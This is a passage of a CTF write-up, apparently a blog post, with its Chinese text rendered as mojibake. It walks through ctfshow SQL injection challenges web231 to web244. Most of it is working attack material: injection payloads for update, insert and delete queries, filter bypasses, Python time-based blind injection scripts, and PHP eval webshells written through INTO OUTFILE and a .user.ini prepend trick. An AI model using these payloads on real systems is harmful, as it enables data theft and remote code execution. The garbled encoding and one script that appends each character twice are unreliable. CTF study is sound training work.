title="web231(updateæ³¨å…¥)"></a>web231(updateæ³¨å…¥)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:æŸ¥è¡¨å  banlist,ctfshow_user,flagapassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;noæŸ¥åˆ—å  id,flagas,infopassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;,username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h4><p>å’Œä¸Šä¸€é¢˜ç›¸æ¯”å¤šç»™ password å¥—äº†ä¸€å±‚ md5 å‡½æ•°åé¢è¿˜æœ‰ä¸ª<code>)</code>æ³¨æ„é—­åˆï¼Œå¯¹åé¢çš„ username æ— å½±å“ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:æŸ¥è¡¨å  banlist,ctfshow_user,flagaapassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;noæŸ¥åˆ—å  id,flagass,infopassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;),username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h4><p>ç¦ç”¨äº†<code>&#39;</code>ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>\</code></p><p>å‡è®¾æˆ‘ä»¬passwordä¼ å…¥\ï¼Œusernameä¼ å…¥,username&#x3D;database()#</p><p>é‚£ä¹ˆæœ€ç»ˆæ„æˆçš„è¯­å¥å¦‚ä¸‹</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;,username&#x3D;database()#&#39;ç­‰ä»·äºupdate ctfshow_user set pass &#x3D; &#39;x&#39;,username&#x3D;database()#&#39;</code></pre><p>æ‰€ä»¥å°±å¯ä»¥ç»•è¿‡äº†ã€‚</p><p><strong>payload</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flag233333password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#è·å–åˆ—å  id,flagass233,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;)%23#è·å–æ•°æ®password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass233) from flag233333)%23</code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://c095983b-1faf-4d65-a053-ba620caed799.challenge.ctf.show/api/?page=1&amp;limit=10"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥æ•°æ®åº“</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥è¡¨å</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"</span>        <span class="token comment"># æŸ¥æ•°æ®</span>        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'4'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flag23apassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#è·å–åˆ—å  id,flagass23s3,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)%23#è·å–æ•°æ®password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass23s3) from flag23a)%23</code></pre><h4 id="web235-mysql-innodb-table-stats-æ— åˆ—åæ³¨å…¥"><a href="#web235-mysql-innodb-table-stats-æ— åˆ—åæ³¨å…¥" class="headerlink" title="web235(mysql.innodb_table_stats  æ— åˆ—åæ³¨å…¥)"></a>web235(mysql.innodb_table_stats  æ— åˆ—åæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ or ' </span></code></pre><p>å› ä¸ºorè¢«ç¦å¯¼è‡´<code>information_schema.tables</code>ä¹Ÿè¢«ç¦äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¡¨<code>mysql.innodb_table_stats</code>å’Œ<code>mysql.innodb_index_stats</code></p><p>æ¥ä»£æ›¿ã€‚</p><p><a href="https://www.jb51.net/article/134678.htm">æ¦‚è¿°MySQLç»Ÿè®¡ä¿¡æ¯</a></p><blockquote><p>5.6.6å¼€å§‹ï¼ŒMySQLé»˜è®¤ä½¿ç”¨äº†æŒä¹…åŒ–ç»Ÿè®¡ä¿¡æ¯ï¼Œå³INNODB_STATS_PERSISTENT&#x3D;ONï¼ŒæŒä¹…åŒ–ç»Ÿè®¡ä¿¡æ¯ä¿å­˜åœ¨è¡¨mysql.innodb_table_statså’Œmysql.innodb_index_statsã€‚</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/98206699">Mysqlæ— åˆ—åæ³¨å…¥</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flag23a1password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##æŸ¥æ•°æ®â€”â€”ç»„åˆ  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;) from (select 1,2,3 union select * from flag23a1 limit 1,1)a);##æŸ¥æ•°æ®â€”â€”é‡å‘½åï¼Œå½“&#96;è¢«è¿‡æ»¤çš„æ—¶å€™password&#x3D;\&amp;username&#x3D;,username&#x3D;(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a);#</code></pre><h4 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ or ' flag</span></code></pre><p>è¿‡æ»¤çš„æ˜¯è¿”å›çš„flagï¼Œæ‰€ä»¥ç”¨<code>to_base64</code>ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flagapassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##æŸ¥æ•°æ®â€”â€”ç»„åˆ  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,to_base64(&#96;2&#96;),&#96;3&#96;) from (select 1,2,3 union select * from flaga limit 1,1)a);##æŸ¥æ•°æ®â€”â€”é‡å‘½åï¼Œå½“&#96;è¢«è¿‡æ»¤çš„æ—¶å€™password&#x3D;\&amp;username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a);#</code></pre><h4 id="web237-insertæ³¨å…¥"><a href="#web237-insertæ³¨å…¥" class="headerlink" title="web237(insertæ³¨å…¥)"></a>web237(insertæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ’å…¥æ•°æ®</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into ctfshow_user(username,pass) value('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>');"</span><span class="token punctuation">;</span></code></pre><p>å‘valueå€¼å†…è¿›è¡Œæ’å…¥ï¼Œå’Œupdateæ³¨å…¥çš„é€»è¾‘ä¸€æ ·</p><p><code>insert into table_name(column1, column2) value(value1,value2)</code></p><p>å‘value1è¿›è¡Œæ³¨å…¥ï¼Œå°±ä¼šå˜æˆ</p><p><code>insert into table_name(column1, column2) value( value1,(ä½ æƒ³è¦è¾“å‡ºçš„å€¼) )#value2)</code></p><p>æ‰€ä»¥è¦æ³¨æ„å¯¹æœ€åä¸€ä¸ªæ‹¬å·çš„é—­åˆ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å  banlist,ctfshow_user,flagusername&#x3D;z&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1# æŸ¥åˆ—å  id,flagass23s3,infousername&#x3D;zz&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select flagass23s3 from flag))#&amp;password&#x3D;1</code></pre><h4 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h4><p>è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨<code>()</code>ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å  banlist,ctfshow_user,flagbusername&#x3D;z&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())))#&amp;password&#x3D;1# æŸ¥åˆ—å  id,flag,infousername&#x3D;zz&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select(flag)from(flagb)))#&amp;password&#x3D;1</code></pre><h4 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ç©ºæ ¼ or </span></code></pre><p>å’Œä¹‹å‰ä¸€æ ·å¯ä»¥ä½¿ç”¨mysql.innodb_table_stats</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å  banlist,ctfshow_user,flagbbusername&#x3D;z&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1# getFlagusername&#x3D;zz&#39;,(select(flag)from(flagbb)))#&amp;password&#x3D;1#  ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— åˆ—åæ³¨å…¥ä¸è¡Œï¼Œwpéƒ½æ˜¯ç›²çŒœåˆ—åusername&#x3D;zz&#39;,(select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)))#&amp;password&#x3D;1select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)</code></pre><h4 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h4><p><strong>Hint</strong>: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a&#x2F;bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ç©ºæ ¼ or sys mysql</span></code></pre><p>è¡¨åé çˆ†ç ´åˆ—åé çŒœ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> repost_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/insert.php"</span>flag_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/?desc&amp;page=1&amp;limit=10"</span>payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f",(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token string">"ab"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'ctfshow&#123;[0-9a-fA-F\-]+&#125;'</span><span class="token punctuation">)</span><span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>post_url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    response_flag <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>flag_url<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> pattern<span class="token punctuation">.</span>search<span class="token punctuation">(</span>response_flag<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] No flag found in the response."</span><span class="token punctuation">)</span></code></pre><h4 id="web241-deleteæ³¨å…¥"><a href="#web241-deleteæ³¨å…¥" class="headerlink" title="web241(deleteæ³¨å…¥)"></a>web241(deleteæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ é™¤è®°å½•</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></code></pre><p>ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://01d94186-8d77-44ea-a4c9-c70d61770349.challenge.ctf.show/api/delete.php"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥æ•°æ®åº“  banlist,ctfshow_user,flag</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥è¡¨å  id,flag,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='flag'"</span>        <span class="token comment"># æŸ¥æ•°æ®</span>        payload <span class="token operator">=</span> <span class="token string">"select flag from flag"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web242-fileæ³¨å…¥"><a href="#web242-fileæ³¨å…¥" class="headerlink" title="web242(fileæ³¨å…¥)"></a>web242(fileæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¤‡ä»½è¡¨</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>åˆ©ç”¨info outfileçš„æ‰©å±•å‚æ•°æ¥åšé¢˜</p><ul><li>SELECT â€¦ INTO OUTFILE â€˜file_nameâ€™<br>    [CHARACTER SET charset_name]<br>    [export_options]</li><li>export_options:<br>[{FIELDS | COLUMNS}<br>    [TERMINATED BY â€˜stringâ€™]&#x2F;&#x2F;åˆ†éš”ç¬¦<br>    [[OPTIONALLY] ENCLOSED BY â€˜charâ€™]<br>    [ESCAPED BY â€˜charâ€™]<br>]<br>[LINES<br>    [STARTING BY â€˜stringâ€™]<br>    [TERMINATED BY â€˜stringâ€™]<br>]</li></ul><p><strong>OPTION</strong>å‚æ•°ä¸ºå¯é€‰å‚æ•°é€‰é¡¹ï¼Œå…¶å¯èƒ½çš„å–å€¼æœ‰ï¼š</p><ul><li><p><code>FIELDS TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;</code>ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\tâ€ã€‚</p></li><li><p><code>FIELDS ENCLOSED BY &#39;å­—ç¬¦&#39;</code>ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½å­—æ®µçš„å€¼ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚</p></li><li><p><code>FIELDS OPTIONALLY ENCLOSED BY &#39;å­—ç¬¦&#39;</code>ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½CHARã€VARCHARå’ŒTEXTç­‰å­—ç¬¦å‹å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚</p></li><li><p><code>FIELDS ESCAPED BY &#39;å­—ç¬¦&#39;</code>ï¼šè®¾ç½®è½¬ä¹‰å­—ç¬¦ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºâ€œ\â€ã€‚</p></li><li><p>*<code>LINES STARTING BY &#39;å­—ç¬¦ä¸²&#39;</code>*ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚</p></li><li><p>*<code>LINES TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;</code>*ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\nâ€ã€‚</p></li></ul><p>å¯ä»¥å†™é©¬çš„å‚æ•°æœ‰ï¼š</p><p><code>FIELDS TERMINATED BY</code>ã€ <code>LINES STARTING BY</code>ã€ <code>LINES TERMINATED BY</code></p><p>åœ¨<code>url/api/dump.php</code>ä¸‹å†™é©¬</p><p>é©¬åœ¨url&#x2F;dump&#x2F;1.php</p><pre class="language-php" data-language="php"><code class="language-php">filename=1.php' LINES STARTING BY "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>";#</code></pre><p>å‘½ä»¤è¡Œåˆ°æ ¹ç›®å½•è¾“å…¥</p><p><code>find / -name &quot;f*&quot; | xargs grep &quot;ctfshow&quot;</code></p><h4 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤äº†php</span></code></pre><p>å…ˆä¸Šiniï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653a312e6a7067;## auto_prepend_file:1.jpg</code></pre><p>æ³¨æ„16è¿›åˆ¶æ˜¯ä¸ºäº†0a(æ¢è¡Œ)å‘æŒ¥ä½œç”¨ï¼Œè€Œ<code>starting by â€œ;â€ï¼Œ</code>æ˜¯æƒ³è®©æ¯è¡Œæ•°æ®çš„å¼€å¤´å­—ç¬¦éƒ½æ˜¯åˆ†å·ï¼Œæ˜¯ä¸ºäº†è®©å‰é¢çš„é‚£ä¸ª</p><p><code>select * from ctfshow_user</code>æŸ¥å‡ºæ¥çš„ä¸œè¥¿ä¸åé¢çš„åšä¸ªäº†æ–­ï¼Œç„¶åä¸ŠğŸ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;1.jpg&#39; LINES TERMINATED BY 0x3c3f3d6576616c28245f504f53545b315d293b3f3e;## &lt;?&#x3D;eval($_POST[1]);?&gt;</code></pre><p>ï¼ˆåšäº†åŠå¤©ä¸€ç›´403ï¼Œçœ‹åˆ°æœ‰ä¸€ä½å¸ˆå‚…ä¹Ÿæ˜¯ä¸€æ ·ï¼Œäºæ˜¯æŠŠhttpsçš„så»æ‰å°±å¯ä»¥äº†ï¼‰</p><h4 id="web244-erroræ³¨å…¥-updatexml"><a href="#web244-erroræ³¨å…¥-updatexml" class="headerlink" title="web244(erroræ³¨å…¥  updatexml)"></a>web244(erroræ³¨å…¥  updatexml)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¤‡ä»½è¡¨</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„):å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹):æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°å…¶éƒ½æ˜¯é’ˆå¯¹xmlè·¯å¾„è¿›è¡Œçš„æ³¨å…¥</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39; or updatexml(1,concat(0x7e,database(),0x7e),1)+--+  # 0x7e --&gt; ~?id&#x3D;1&#39; or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+--+</code></pre><p>çœ‹åˆ°äº†å¥½ä¸œè¥¿</p><pre class="language-mysql" 